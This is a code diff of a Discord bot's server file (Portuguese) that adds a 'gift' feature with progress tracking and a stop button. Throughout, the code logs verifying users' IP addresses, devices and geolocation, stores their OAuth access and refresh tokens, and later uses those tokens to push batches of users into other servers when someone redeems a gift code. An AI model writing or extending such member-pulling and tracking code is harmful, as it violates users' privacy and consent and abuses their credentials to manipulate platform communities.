@@ -1,7 +1,7 @@
 console.log('🚀 [server.js] arquivo foi carregado');
 
 const axios = require('axios');
-const { EmbedBuilder } = require('discord.js');
+const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 const { renderGiftPage } = require('./giftPage');
 
 module.exports = (app, client) => {
@@ -40,7 +40,6 @@ module.exports = (app, client) => {
             }
             return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
         } catch (err) {
-            console.error('❌ [GEO] erro:', err.message);
             return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
         }
     }
@@ -48,17 +47,9 @@ module.exports = (app, client) => {
     // ============================
     // ROTAS BÁSICAS
     // ============================
-    app.get('/', (req, res) => {
-        res.render('index.html');
-    });
+    app.get('/', (req, res) => res.render('index.html'));
+    app.get('/ping', (req, res) => res.status(200).send('pong ✅'));
 
-    app.get('/ping', (req, res) => {
-        res.status(200).send('pong ✅');
-    });
-
-    // ============================
-    // ROTA DE CONVITE DO BOT
-    // ============================
     app.get('/invite', (req, res) => {
         const clientId = process.env.CLIENT_ID;
         const perms = '8';
@@ -106,7 +97,7 @@ module.exports = (app, client) => {
     });
 
     // ============================
-    // API QUE PROCESSA O GIFT
+    // API QUE PROCESSA O GIFT (com progresso + parar)
     // ============================
     app.post('/api/gift/:codigo', async (req, res) => {
         try {
@@ -151,17 +142,24 @@ module.exports = (app, client) => {
             gift.servidorUsado = guildId;
             gift.usados = gift.quantidade;
             gift.esgotadoEm = Date.now();
+            gift.puxados = 0;
+            gift.falhas = 0;
             gifts[codigo] = gift;
             await config.set('gifts', gifts);
 
-            puxarMembros(client, guildId, toPull).then(r => {
-                console.log(`✅ [GIFT ${codigo}] ${r.puxados}/${r.total} puxados`);
-            }).catch(err => {
-                console.error(`❌ [GIFT ${codigo}]:`, err.message);
+            // Envia log inicial
+            await enviarLogGift(client, 'usado', {
+                codigo,
+                quantidade: gift.quantidade,
+                guildId,
+                guildName: guild.name
             });
 
+            // Inicia puxada em background
+            puxarMembrosGift(client, codigo, guildId, toPull, guild);
+
             return res.json({
-                mensagem: `O bot começou a puxar **${toPull.length} membros** pro servidor **${guild.name}**. Vai levar alguns minutos.`
+                mensagem: `O bot começou a puxar **${toPull.length} membros** pro servidor **${guild.name}**. Acompanhe no canal de logs!`
             });
 
         } catch (err) {
@@ -200,27 +198,18 @@ module.exports = (app, client) => {
 
             const userData = userResponse.data;
 
-            let ip =
-                req.headers['cf-connecting-ip'] ||
-                req.headers['x-forwarded-for'] ||
-                req.socket.remoteAddress;
-
+            let ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
             if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
             if (ip && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
 
             const userDevice = req.headers['user-agent'] || 'Unknown';
-
-            console.log('🌍 [GEO] buscando localização para IP:', ip);
             const geo = await getGeoInfo(ip);
-            console.log('🌍 [GEO] resultado:', `${geo.cidade} / ${geo.estado} / ${geo.pais}`);
 
             let jaEstavaNoBanco = false;
             try {
                 const existing = await users.get(userData.id);
                 if (existing) jaEstavaNoBanco = true;
-            } catch (err) {
-                console.error('❌ [DB] erro ao checar:', err.message);
-            }
+            } catch (err) {}
 
             try {
                 await users.set(userData.id, {
@@ -237,9 +226,8 @@ module.exports = (app, client) => {
                     pais: geo.pais,
                     verifiedAt: new Date().toISOString()
                 });
-                console.log('💾 [DB] usuário salvo:', userData.id);
             } catch (err) {
-                console.error('❌ [DB] erro ao salvar:', err.message);
+                console.error('❌ [DB] erro salvar:', err.message);
             }
 
             const guildId = process.env.GUILD_ID;
@@ -247,31 +235,17 @@ module.exports = (app, client) => {
             try {
                 const configRoleId = await config.get('roleId');
                 if (configRoleId) roleId = configRoleId;
-            } catch (err) {
-                console.error('❌ [CONFIG] erro:', err.message);
-            }
-
-            console.log('🔍 [CARGO] guildId:', guildId);
-            console.log('🔍 [CARGO] roleId:', roleId);
-            console.log('🔍 [CARGO] userData.id:', userData.id);
+            } catch (err) {}
 
             let cargoAtribuido = false;
             let entrouAgora = false;
             let motivoFalha = null;
 
-            if (!guildId) {
-                console.error('❌ [CARGO] GUILD_ID não configurado!');
-                motivoFalha = 'GUILD_ID não configurado';
-            } else if (!roleId) {
-                console.error('❌ [CARGO] ROLE_ID não configurado!');
-                motivoFalha = 'ROLE_ID não configurado';
-            } else {
+            if (guildId && roleId) {
                 try {
-                    const putData = { access_token, roles: [roleId] };
-
                     const resp = await axios.put(
                         `https://discord.com/api/v10/guilds/${guildId}/members/${userData.id}`,
-                        putData,
+                        { access_token, roles: [roleId] },
                         {
                             headers: {
                                 Authorization: `Bot ${process.env.TOKEN}`,
@@ -281,14 +255,10 @@ module.exports = (app, client) => {
                         }
                     );
 
-                    console.log('📥 [CARGO] resposta:', resp.status);
-
                     if (resp.status === 201) {
-                        console.log('✅ [CARGO] ADICIONADO com cargo');
                         cargoAtribuido = true;
                         entrouAgora = true;
                     } else if (resp.status === 204) {
-                        console.log('🔧 [CARGO] já estava, aplicando...');
                         const roleResp = await axios.put(
                             `https://discord.com/api/v10/guilds/${guildId}/members/${userData.id}/roles/${roleId}`,
                             {},
@@ -300,46 +270,24 @@ module.exports = (app, client) => {
                                 validateStatus: false
                             }
                         );
-                        console.log('📥 [CARGO] PUT /roles:', roleResp.status);
-                        if (roleResp.status === 204) {
-                            console.log('✅ [CARGO] APLICADO!');
-                            cargoAtribuido = true;
-                        } else {
-                            console.error('❌ [CARGO] erro:', roleResp.status, JSON.stringify(roleResp.data));
-                            motivoFalha = `Erro ${roleResp.status}: ${roleResp.data?.message || 'desconhecido'}`;
-                        }
+                        if (roleResp.status === 204) cargoAtribuido = true;
+                        else motivoFalha = `Erro ${roleResp.status}`;
                     } else {
-                        console.error('❌ [CARGO] erro:', resp.status, JSON.stringify(resp.data));
-                        motivoFalha = `Erro ${resp.status}: ${resp.data?.message || 'desconhecido'}`;
+                        motivoFalha = `Erro ${resp.status}`;
                     }
                 } catch (err) {
-                    console.error('❌ [CARGO] exceção:', err.message);
                     motivoFalha = err.message;
-                    if (err.response) {
-                        console.error('❌ [CARGO] status:', err.response.status);
-                        console.error('❌ [CARGO] data:', JSON.stringify(err.response.data));
-                    }
                 }
             }
 
-            const createdAt = new Date(
-                Number((BigInt(userData.id) >> 22n) + 1420070400000n)
-            );
-            const now = new Date();
-            const accountDays = Math.floor((now - createdAt) / (1000 * 60 * 60 * 24));
+            const createdAt = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
+            const accountDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
 
             try {
                 await sendLog(client, userData, ip, userDevice, geo, config, {
-                    cargoAtribuido,
-                    entrouAgora,
-                    motivoFalha,
-                    jaEstavaNoBanco,
-                    accountDays
+                    cargoAtribuido, entrouAgora, motivoFalha, jaEstavaNoBanco, accountDays
                 });
-                console.log('📝 [LOG] embed enviada');
-            } catch (err) {
-                console.error('❌ [LOG] erro:', err.message);
-            }
+            } catch (err) {}
 
             const guild = client.guilds.cache.get(guildId);
 
@@ -359,91 +307,49 @@ module.exports = (app, client) => {
 
         } catch (error) {
             console.error('❌ [CALLBACK] erro:', error.message);
-            if (error.response) {
-                console.error('❌ [CALLBACK] status:', error.response.status);
-                console.error('❌ [CALLBACK] data:', JSON.stringify(error.response.data));
-            }
-
             const errData = error.response?.data;
             let mensagem = 'Ocorreu um erro ao processar sua verificação.';
 
             if (errData?.error === 'invalid_grant') {
                 mensagem = 'Esse link já foi usado ou expirou. Gere um novo link de verificação e tente novamente.';
             } else if (errData?.error === 'access_denied') {
-                mensagem = 'Você cancelou a autorização. Se quiser se verificar, clique no link novamente.';
+                mensagem = 'Você cancelou a autorização.';
             } else if (error.message) {
                 mensagem = error.message;
             }
 
             res.status(400).send(`
                 <!DOCTYPE html>
-                <html lang="pt-BR">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>Erro na Verificação</title>
-                    <style>
-                        * { margin: 0; padding: 0; box-sizing: border-box; }
-                        body {
-                            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-                            background: #1e1f22;
-                            color: #dbdee1;
-                            display: flex;
-                            align-items: center;
-                            justify-content: center;
-                            min-height: 100vh;
-                            padding: 20px;
-                        }
-                        .card {
-                            background: #2b2d31;
-                            border-radius: 16px;
-                            padding: 40px;
-                            max-width: 500px;
-                            text-align: center;
-                            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-                        }
-                        .icon { font-size: 64px; margin-bottom: 20px; }
-                        h1 { font-size: 24px; color: #f2f3f5; margin-bottom: 16px; }
-                        p { font-size: 16px; color: #b5bac1; line-height: 1.6; margin-bottom: 24px; }
-                        .footer { font-size: 13px; color: #80848e; margin-top: 20px; }
-                    </style>
-                </head>
-                <body>
-                    <div class="card">
-                        <div class="icon">❌</div>
-                        <h1>Erro na Verificação</h1>
-                        <p>${mensagem}</p>
-                        <div class="footer">Você pode fechar esta janela.</div>
-                    </div>
-                </body>
-                </html>
+                <html lang="pt-BR"><head><meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Erro na Verificação</title>
+                <style>* { margin: 0; padding: 0; box-sizing: border-box; }
+                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1e1f22; color: #dbdee1; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+                .card { background: #2b2d31; border-radius: 16px; padding: 40px; max-width: 500px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
+                .icon { font-size: 64px; margin-bottom: 20px; }
+                h1 { font-size: 24px; color: #f2f3f5; margin-bottom: 16px; }
+                p { font-size: 16px; color: #b5bac1; line-height: 1.6; }</style>
+                </head><body><div class="card"><div class="icon">❌</div><h1>Erro na Verificação</h1><p>${mensagem}</p></div></body></html>
             `);
         }
     });
 
-    // ============================
-    // ROTA DE ERRO
-    // ============================
     app.get('/error', (req, res) => {
-        res.render('error.html', {
-            error: req.query.msg || 'Unknown error'
-        });
+        res.render('error.html', { error: req.query.msg || 'Unknown error' });
     });
 
     console.log('✅ [server.js] todas as rotas foram registradas');
 };
 
 // ============================
-// FUNÇÃO DE LOG
+// FUNÇÃO DE LOG (verificação)
 // ============================
 async function sendLog(client, userData, ip, userDevice, geo, config, status) {
     let logChannelId = process.env.LOG_CHANNEL_ID;
     try {
         const configLogId = await config.get('logChannelId');
         if (configLogId) logChannelId = configLogId;
-    } catch (err) {
-        console.error('❌ [LOG] erro:', err.message);
-    }
+    } catch (err) {}
     if (!logChannelId) return;
 
     const channel = client.channels.cache.get(logChannelId);
@@ -461,11 +367,8 @@ async function sendLog(client, userData, ip, userDevice, geo, config, status) {
         }
     } catch { return; }
 
-    const creationDate = new Date(
-        Number((BigInt(userData.id) >> 22n) + 1420070400000n)
-    );
-    const now = new Date();
-    const creationAccountDays = Math.floor((now - creationDate) / (1000 * 60 * 60 * 24));
+    const creationDate = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
+    const creationAccountDays = Math.floor((Date.now() - creationDate) / (1000 * 60 * 60 * 24));
 
     const userAvatar = userData.avatar
         ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
@@ -480,10 +383,7 @@ async function sendLog(client, userData, ip, userDevice, geo, config, status) {
 
     const embed = new EmbedBuilder()
         .setColor(status.cargoAtribuido ? 4806097 : 0xff4d4d)
-        .setAuthor({
-            name: `${userData.username} (${userData.id})`,
-            iconURL: userAvatar
-        })
+        .setAuthor({ name: `${userData.username} (${userData.id})`, iconURL: userAvatar })
         .setThumbnail(userAvatar)
         .setDescription(
             `**Menção:** <@${userData.id}>\n` +
@@ -503,32 +403,131 @@ async function sendLog(client, userData, ip, userDevice, geo, config, status) {
         .setTimestamp();
 
     if (status.motivoFalha) {
-        embed.addFields({
-            name: '⚠️ Motivo da Falha',
-            value: `\`${status.motivoFalha.substring(0, 1020)}\``
-        });
+        embed.addFields({ name: '⚠️ Motivo da Falha', value: `\`${status.motivoFalha.substring(0, 1020)}\`` });
     }
 
     await webhook.send({ embeds: [embed] });
 }
 
 // ============================
-// FUNÇÃO AUXILIAR — PUXAR MEMBROS
+// LOG DE GIFT
 // ============================
-async function puxarMembros(client, guildId, userList) {
-    const axios = require('axios');
-    const { users } = require('../database');
+async function enviarLogGift(client, tipo, dados) {
+    try {
+        const { config } = require('../database');
+        const logChannelId = await config.get('giftLogChannelId');
+        if (!logChannelId) return;
 
-    let puxados = 0;
-    let falhas = 0;
+        const channel = client.channels.cache.get(logChannelId);
+        if (!channel) return;
+
+        let embed;
+
+        if (tipo === 'criado') {
+            embed = new EmbedBuilder()
+                .setColor(0x57F287)
+                .setTitle('🎁 Gift Criado')
+                .addFields(
+                    { name: 'Código', value: `\`${dados.codigo}\``, inline: true },
+                    { name: 'Quantidade', value: `\`${dados.quantidade} membros\``, inline: true },
+                    { name: 'Criado por', value: `<@${dados.criadoPor}>`, inline: true }
+                )
+                .setTimestamp();
+        } else if (tipo === 'usado') {
+            embed = new EmbedBuilder()
+                .setColor(0xFEE75C)
+                .setTitle('🎁 Gift Usado — Iniciando puxada')
+                .addFields(
+                    { name: 'Código', value: `\`${dados.codigo}\``, inline: true },
+                    { name: 'Quantidade', value: `\`${dados.quantidade} membros\``, inline: true },
+                    { name: 'Servidor', value: `${dados.guildName} (\`${dados.guildId}\`)`, inline: false }
+                )
+                .setTimestamp();
+        } else if (tipo === 'deletado') {
+            embed = new EmbedBuilder()
+                .setColor(0xED4245)
+                .setTitle('🗑️ Gift Deletado')
+                .addFields(
+                    { name: 'Código', value: `\`${dados.codigo}\``, inline: true },
+                    { name: 'Quantidade', value: `\`${dados.quantidade} membros\``, inline: true },
+                    { name: 'Deletado por', value: `<@${dados.deletadoPor}>`, inline: true }
+                )
+                .setTimestamp();
+        }
+
+        if (embed) await channel.send({ embeds: [embed] });
+    } catch (err) {
+        console.error('❌ [GIFT LOG] erro:', err.message);
+    }
+}
+
+// ============================
+// PUXAR MEMBROS DO GIFT (com progresso + parar)
+// ============================
+async function puxarMembrosGift(client, codigo, guildId, userList, guild) {
+    const { config } = require('../database');
+
+    // Armazena operação pra permitir parar
+    client.operacoesGift = client.operacoesGift || new Map();
+    client.operacoesGift.set(codigo, { parar: false });
+
+    let puxados = 0, falhas = 0, processed = 0;
+
+    // Envia mensagem inicial de progresso
+    const logChannelId = await config.get('giftLogChannelId');
+    let progressMsg = null;
+    let progressChannel = null;
+
+    if (logChannelId) {
+        progressChannel = client.channels.cache.get(logChannelId);
+        if (progressChannel) {
+            const embedProgresso = new EmbedBuilder()
+                .setColor(0x5865F2)
+                .setTitle(`🔄 Puxando — Gift ${codigo}`)
+                .setDescription(`Servidor: **${guild.name}**`)
+                .addFields(
+                    { name: '📊 Progresso', value: `\`0/${userList.length}\``, inline: true },
+                    { name: '✅ Puxados', value: '`0`', inline: true },
+                    { name: '❌ Falhas', value: '`0`', inline: true }
+                )
+                .setFooter({ text: 'Clique no botão abaixo pra parar' })
+                .setTimestamp();
+
+            const botaoParar = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder()
+                        .setCustomId(`gift_parar_${codigo}`)
+                        .setLabel('Parar de Puxar')
+                        .setEmoji('🛑')
+                        .setStyle(ButtonStyle.Danger)
+                );
+
+            try {
+                progressMsg = await progressChannel.send({
+                    embeds: [embedProgresso],
+                    components: [botaoParar]
+                });
+            } catch (err) {
+                console.error('❌ [GIFT] erro ao enviar progresso:', err.message);
+            }
+        }
+    }
 
     for (const userData of userList) {
+        // Verifica se pediu pra parar
+        const op = client.operacoesGift.get(codigo);
+        if (op && op.parar) {
+            console.log(`🛑 [GIFT ${codigo}] parado pelo usuário`);
+            break;
+        }
+
         const userId = userData.id;
         const accessToken = userData.access_token;
         const refreshToken = userData.refresh_token;
 
         if (!accessToken || !userId) {
             falhas++;
+            processed++;
             continue;
         }
 
@@ -580,24 +579,89 @@ async function puxarMembros(client, guildId, userList) {
                             validateStatus: false
                         }
                     );
-                } catch (err) {
-                    console.error(`Erro no refresh de ${userId}:`, err.message);
-                }
+                } catch (err) {}
             }
 
             if (resp.status === 201 || resp.status === 204) {
                 puxados++;
             } else {
                 falhas++;
-                console.error(`❌ Falha ao puxar ${userId}: ${resp.status} ${JSON.stringify(resp.data)}`);
             }
         } catch (err) {
             falhas++;
-            console.error(`❌ Erro ao puxar ${userId}:`, err.message);
         }
 
-        await new Promise(r => setTimeout(r, 500));
+        processed++;
+
+        // Atualiza a cada 5
+        if (progressMsg && (processed % 5 === 0 || processed === userList.length)) {
+            try {
+                const embedAtualizada = new EmbedBuilder()
+                    .setColor(0x5865F2)
+                    .setTitle(`🔄 Puxando — Gift ${codigo}`)
+                    .setDescription(`Servidor: **${guild.name}**`)
+                    .addFields(
+                        { name: '📊 Progresso', value: `\`${processed}/${userList.length}\``, inline: true },
+                        { name: '✅ Puxados', value: `\`${puxados}\``, inline: true },
+                        { name: '❌ Falhas', value: `\`${falhas}\``, inline: true }
+                    )
+                    .setFooter({ text: 'Clique no botão abaixo pra parar' })
+                    .setTimestamp();
+
+                const botaoParar = new ActionRowBuilder()
+                    .addComponents(
+                        new ButtonBuilder()
+                            .setCustomId(`gift_parar_${codigo}`)
+                            .setLabel('Parar de Puxar')
+                            .setEmoji('🛑')
+                            .setStyle(ButtonStyle.Danger)
+                    );
+
+                await progressMsg.edit({
+                    embeds: [embedAtualizada],
+                    components: [botaoParar]
+                });
+            } catch (err) {}
+        }
+
+        // Delay pra evitar rate limit
+        await new Promise(r => setTimeout(r, 600));
     }
 
-    return { puxados, falhas, total: userList.length };
+    // Remove a operação
+    client.operacoesGift.delete(codigo);
+
+    // Atualiza o gift no banco com os resultados
+    try {
+        const gifts = (await config.get('gifts')) || {};
+        if (gifts[codigo]) {
+            gifts[codigo].puxados = puxados;
+            gifts[codigo].falhas = falhas;
+            await config.set('gifts', gifts);
+        }
+    } catch (err) {}
+
+    // Edita a mensagem final (sem botão)
+    if (progressMsg) {
+        try {
+            const parado = !!(client.operacoesGift.get(codigo) === undefined && processed < userList.length);
+            const embedFinal = new EmbedBuilder()
+                .setColor(parado ? 0xffa500 : (puxados > 0 ? 0x57F287 : 0xED4245))
+                .setTitle(parado ? `🛑 Puxada Cancelada — Gift ${codigo}` : `✅ Gift ${codigo} Finalizado`)
+                .setDescription(`Servidor: **${guild.name}**`)
+                .addFields(
+                    { name: '📊 Processados', value: `\`${processed}/${userList.length}\``, inline: true },
+                    { name: '✅ Puxados', value: `\`${puxados}\``, inline: true },
+                    { name: '❌ Falhas', value: `\`${falhas}\``, inline: true }
+                )
+                .setTimestamp();
+
+            await progressMsg.edit({
+                embeds: [embedFinal],
+                components: []
+            });
+        } catch (err) {}
+    }
+
+    console.log(`✅ [GIFT ${codigo}] ${puxados} puxados, ${falhas} falhas`);
 }
